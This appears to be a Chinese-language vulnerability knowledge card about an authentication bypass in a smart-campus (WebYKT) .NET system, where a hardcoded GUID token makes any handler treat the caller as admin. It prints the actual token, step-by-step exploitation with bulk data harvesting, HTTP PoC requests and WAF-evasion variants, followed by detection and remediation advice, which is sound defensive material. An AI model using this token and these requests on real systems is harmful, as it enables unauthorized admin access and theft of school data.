---
id: web-generic-auth-hardcoded-token-handlebase-admin-bypass
title: .NET HandleBase 硬编码 token 直接返回 admin：继承该基类的任意 Handler 未授权访问
type: scenario
domain: web
path: web/generic/auth
technique: dotnet-hardcoded-token-auth-bypass
aliases:
- 智慧校园鉴权绕过
- HandleBase 硬编码 token
- 88E7EFEA-8EB8-4D51-B936-47D8957F1BFE
- GetCookiesUserId 返回 admin
- WebYKT 未授权
tags:
- auth-bypass
- dotnet
- ashx
- hardcoded-token
- handler
- admin
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V38
  verified_at: '2026-11-05T06:02:50+08:00'
  notes: 已通读原文并逐张核对19张图：HandleBase.ProcessRequest 第14行 GetCookiesUserId→IsNullOrEmpty→重定向'鉴权失败,请重新登陆'，CookiesLogic.GetCookiesUserId 第123-130行 token==88E7EFEA-8EB8-4D51-B936-47D8957F1BFE 时 strLoginName=admin，与卡一致；实测 /SLog.ashx 无 token 302 Object moved、带 token 200 返回约2MB total=10964 日志，均与卡一致。卡内变体（token 放 form/cookie、kaduser AES 密钥）为合理推断未在原文验证。frontmatter 无 sources/source_url；未在本机复跑。
---

## 一句话结论

某智慧校园（WebYKT）系统的 `HandleBase` 在 `ProcessRequest` 中先用 `CookiesLogic.GetCookiesUserId()` 取登录名、为空则重定向“鉴权失败”；而 `GetCookiesUserId` 里有一段硬编码判断：`context.Request.Params["token"] == "88E7EFEA-8EB8-4D51-B936-47D8957F1BFE"` 时直接把 `strLoginName = "admin"` 返回。攻击者在任意继承 `HandleBase` 的 `.ashx` 请求上附带 `token=88E7EFEA-8EB8-4D51-B936-47D8957F1BFE`，即可以 admin 身份通过鉴权，无需任何账号口令。

## 原理

- `HandleBase : IHttpHandler` 的 `ProcessRequest`：
  1. `string strLoginName = CookiesLogic.GetCookiesUserId(HttpContext.Current);`
  2. `bool flag = string.IsNullOrEmpty(strLoginName);`
  3. 为空则 `Response.Redirect("鉴权失败,请重新登陆")` + `Response.End()`；
  4. 否则调用子类重写的 `AjaxProcess(context)`。
- `CookiesLogic.GetCookiesUserId(HttpContext context)`：
  - `string strToken = context.Request.Params["token"] ?? "";`
  - `bool flag = strToken == "88E7EFEA-8EB8-4D51-B936-47D8957F1BFE";`
  - `if (flag) { strLoginName = "admin"; }`
  - 否则走 CAS 单点登录 / `kaduser` Cookie 解密等正常路径。
- `Request.Params` 合并 query、form、cookie、server variables，因此 `token` 放在 URL 查询串、POST 表单或 Cookie 中都能进入比较；比较是普通字符串全等，没有时间/签名/绑定校验。
- 硬编码 token 是“后门式”万能凭证：它不是某个用户的票据，而是直接映射到固定的 `admin` 字面量，任何知道该字符串的人都能通过 `HandleBase` 的鉴权。
- 由于所有继承 `HandleBase` 的 Handler 共用这段逻辑，一个 token 即可横向访问所有这类接口；文章用 `SLog.ashx` 验证：不带 token 返回 302 到“未登录”，带 token 返回 200 与约 2MB 的日志数据。
- 根因是把“认证”实现成常量比较，且常量写死在代码中；正确做法是 token 由服务端签发、可撤销、绑定用户与有效期，并与服务端会话/签名校验结合。

## 触发条件

- 目标为该智慧校园系统（WebYKT 系列 DLL / `.ashx` Handler 架构）。
- 目标存在继承 `HandleBase` 的 Handler 且可访问（文章示例 `/SLog.ashx`、`/ashx/...` 等）。
- 攻击者知道硬编码 token（源码/反编译 DLL 可获得；文章直接给出）。
- `token` 参数未被网关/WAF 剥离，且 `Request.Params` 能读到。

## 利用步骤

1. 反编译站点 DLL（如 `WebYKT.Web.dll`），定位 `HandleBase` 与 `CookiesLogic.GetCookiesUserId`，确认硬编码 token 值。
2. 找一个继承 `HandleBase` 的 Handler 与其 `action`（文章示例 `SLog.ashx` 的 `action=GetLogInfo`）。
3. 不带 token 请求，确认返回 302/“鉴权失败”；带 `token=88E7EFEA-8EB8-4D51-B936-47D8957F1BFE` 请求，确认返回业务数据。
4. 遍历其它继承 `HandleBase` 的 Handler/action，用同一 token 批量访问，收集日志、用户、配置等敏感数据。
5. 若接口支持写操作，进一步修改配置/数据；结合系统中的文件上传、SQL 注入等漏洞扩大影响。

## PoC

```http
### 未授权访问：不带 token
POST /SLog.ashx?action=GetLogInfo HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

### 预期：302 / “鉴权失败,请重新登陆”

### 带硬编码 token：直接以 admin 身份通过
POST /SLog.ashx?token=88E7EFEA-8EB8-4D51-B936-47D8957F1BFE&action=GetLogInfo HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

### 预期：200，返回日志 JSON（文章截图为约 2MB、total=10964 的 rows）
```

```text
GetCookiesUserId 关键逻辑：
  strToken = Request.Params["token"] ?? "";
  if (strToken == "88E7EFEA-8EB8-4D51-B936-47D8957F1BFE") {
      strLoginName = "admin";
  }
  return strLoginName;   // HandleBase 只判断非空，非空即放行

文章附请求/响应对比截图；本卡未在本机复现。
```

## 变体与关联

- 变体（参数位置）：`token` 可放 query、form、Cookie；`Request.Params` 都会读取，WAF 只查 URL 时可用表单/Cookie 绕过。
- 变体（其它硬编码凭证）：同一套 `CookiesLogic` 中可能还有其它固定 token/默认密钥；反编译后搜索长十六进制/GUID 字符串与 `==` 比较。
- 变体（身份来源）：即使去掉硬编码 token，`kaduser` Cookie 若使用固定 AES 密钥（`AesHelper.Decrypt`）也可伪造，属于同一鉴权设计缺陷的延伸。
- 关联：同层“身份由客户端参数/固定凭证决定”的认证绕过卡；本卡的关键是硬编码常量直接映射 admin。
- 边界：若目标已删除该 token 分支、改为服务端签发票据，或网关阻断 `token` 参数，链路失效；token 只对继承 `HandleBase` 的接口有效，不覆盖其它鉴权体系。

## 检测与防御

- 请求检测：任意请求出现 `token=88E7EFEA-8EB8-4D51-B936-47D8957F1BFE`（或其它固定 GUID/长 hex）；同一 token 在无登录流程的情况下访问多个 `.ashx`；`token` 值在 query/form/cookie 之间切换。
- 日志检测：`HandleBase`/`GetCookiesUserId` 日志中出现 admin 身份但无 CAS/登录记录；同一 IP 短时间内访问大量 Handler。
- 修复：删除硬编码 token 分支；所有身份必须来自服务端签发且可校验的票据（签名、有效期、绑定用户/IP/会话），禁止常量比较。
- 修复：`HandleBase` 只判断“非空”不够，应校验票据签名与用户状态；`AjaxProcess` 前增加角色/权限检查。
- 加固：反编译审计所有 DLL 中的硬编码密钥/token；网关层统一认证并剥离客户端 `token` 参数；监控异常 admin 会话与批量 Handler 访问。
- 审计：搜索 `== "` 与 GUID/长 hex 常量、`SetAuthCookie`、`GetCookieUserId`、`AesHelper.Decrypt` 的固定密钥；检查所有继承鉴权基类的 Handler 是否真正校验了身份来源。
